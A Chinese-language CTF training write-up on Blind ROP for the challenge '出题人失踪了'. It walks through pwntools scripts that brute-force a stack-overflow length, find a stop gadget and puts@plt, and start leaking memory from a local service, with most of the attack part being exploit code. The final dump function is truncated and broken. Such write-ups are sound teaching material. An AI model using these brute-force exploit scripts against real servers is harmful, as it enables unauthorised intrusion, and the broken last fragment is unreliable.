关于BROP（一）

前言

针对省赛初赛的两道BROP题目，我在这里分析并讲解一下BROP的基本做法，这里使用的是CTF WiKi的例子：“出题人失踪了”。

题目建议在战队网盘里下载，我把题目的一系列脚本以及分析都放在那里，建议先读readme.txt，详情如下

BROP是什么

brop：一种不给你二进制文件的骚操作

它实际上还是一种栈溢出的题目，需要做题的人不断的测试，考验做题人的脚本编写能力以及分析能力，一般不会特别苦难。

攻击前提

1.源程序必须存在栈溢出，让攻击者可以控制程序流

2.服务器端的进程在崩溃后会重新启动，并且重新启动的 进程地址和先前的地址一样

一般的攻击步骤

1.暴力枚举，获取栈的长度，如果开启了Canary ，就把canary也爆破出来

2.寻找可以返回到程序main函数的gadget ,通常被称为stop_gadget

3.需找pop_rdi gadget

4.找到puts_plt的地址

5.dump下二进制文件的一部分 0x400000 - 0x401000

6.通过泄露puts_got的内容，泄露出libc的内存信息，最后rop getshell

不懂不要紧，继续看下去

解题

获取栈的长度

我们了解了BROP其实也是一种栈溢出题，第一步那肯定是测试看看如何才能满足栈溢出这个条件

一般我们都是分析题目给的文件来获取，但是没有文件，那我们就一个个试呗，从1开始，不断的测试，直到刚好满足栈溢出。当然这是笨方法，我们让计算机帮我们完成

首先看看怎么下手

运行起来发现

首先抛出了一句

WelCome my friend,Do you know password?

这边输入

adfdas

返回

No password, no game

直接上脚本再分析

from pwn import*
def getsize():
    i = 1
    while 1:
        try:
            p = remote('127.0.0.1',9999)
            p.recvuntil("WelCome my friend,Do you know password?\n")
            p.send(i*b'a')
            data = p.recv()
            p.close()
            if not data.startswith(b'No password'):
                return i-1
            else:
                i+=1
        except EOFError:
            p.close()
            return i-1

size = getsize()
print ("size is [%s]"%size)

在这里开始逐步分析脚本

p = remote('127.0.0.1',9999)

这里连接本地的9999端口，我把详细信息放在解释文件里面，可以回过头看看。

p.recvuntil("WelCome my friend,Do you know password?\n")

            data = p.recv()

在接收到"WelCome my friend,Do you know password?\n"后，发送适当长度的payload，用data来接收返回，

if not data.startswith(b'No password'):
                return i-1
            else:
                i+=1

            p.close()
            return i-1

size = getsize()

只要返回了'No password'，那说明还没有满足栈溢出的条件，利用循环增加i，当刚好程序崩溃时，返回i-1，这里i-1就是刚好满足栈溢出，print出来

结果"size is  72"，即输入72个字节的字符串

寻找stop_gadget

满足栈溢出后，我们需要让程序停止，不至于结束或者崩溃，这里一般寻找start函数或者main函数，这两个函数都可以让程序重新来过，到需要做题人输入时就相当于停止了

同样，先上脚本

from pwn import *
#这里利用了上一步找到的length
length = 72
 
def getStopGadgets(length):
    #这里是为了减少测试时间使用的0x4005b0，遇到题目没有提示的话就从0x000000开始呗
    addr = 0x4005b0
    while 1:
        try: 
            sh = remote('127.0.0.1',9999)
            payload = b'a'*length +p64(addr)
            sh.recvuntil("know password?\n")
            sh.sendline(payload)
            output = sh.recvuntil("password?\n")
            sh.close()
            print("one success addr 0x%x:" % (addr))
            if not output.startswith(b'WelCome'):
                sh.close()
                addr+=1
            else:
                return addr
        except Exception:
            addr+=1
            sh.close()
stop_gadgets = getStopGadgets(length)

在接收到"know password?\n"后传入payload，payload先满足栈溢出，再传入地址，如果又重新接收到"know password?\n"说明我们成功了，把地址输出来

找到puts_plt的地址

上面的所有结束之后，我们需要找一些可以利用的函数，用它把内部消息给回显出来，这样我们才知道下一步怎么进行

from pwn import *

##使用已知信息
length = 72
stop_gadget = 0x4005c0

def get_puts_addr(length, rdi_ret, stop_gadget):
    addr = 0x400500
    while 1:
        print hex(addr)
        sh = remote('127.0.0.1', 9999)
        sh.recvuntil('password?\n')
        payload = b'A' * length + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)
        sh.sendline(payload)
        try:
            content = sh.recv()
            if content.startswith('\x7fELF'):
                print ('find puts@plt addr: 0x%x' % (addr))
                return addr
            sh.close()
            addr += 1
        except Exception:
            sh.close()
            addr += 1

brop_gadget=0x4007ba
rdi_ret=brop_gadget+9
get_puts_addr(72,rdi_ret,stop_gadget)

下面来分析一下脚本

payload = b'A' * length + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)

p64(rdi_ret) + p64(0x400000) 将地址作为参数放在rdi里，如果addr是puts_plt的话，就会把这个0x400000打出来

content.startswith('\x7fELF')

如果返回的是'\x7fELF'这种形式，就说明我们找到了。

泄露puts_got的内容

from pwn import *
def dump(length, rdi_ret, puts_plt, leak_addr, stop_gadget):

    payload = b'a' * length + p64(rdi_ret) + p64(leak_addr) + p64(
        puts_plt) + p64(stop_gadget)

        if data == "":
            data = '\x00'
        return data
    except Exception:
        sh.close()
        return None
